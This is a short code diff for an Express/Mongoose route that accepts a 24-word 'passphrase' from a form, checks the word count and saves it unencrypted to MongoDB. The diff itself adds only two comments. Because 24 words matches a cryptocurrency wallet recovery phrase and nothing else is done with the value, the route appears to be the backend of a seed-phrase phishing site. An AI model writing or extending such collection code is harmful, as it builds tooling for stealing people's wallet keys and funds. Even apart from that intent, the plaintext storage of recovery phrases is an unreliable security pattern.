@@ -26,11 +26,13 @@ const Passphrase = mongoose.model('Passphrase', PassphraseSchema);
 app.post('/submit', async (req, res) => {
     const { passphrase } = req.body;
 
+    // Validate passphrase
     if (!passphrase || passphrase.trim().split(" ").length !== 24) {
         return res.status(400).send('Invalid passphrase. Ensure it has exactly 24 words.');
     }
 
     try {
+        // Save passphrase to MongoDB
         const newPassphrase = new Passphrase({ passphrase });
         await newPassphrase.save();
         res.status(200).send('Passphrase saved successfully!');
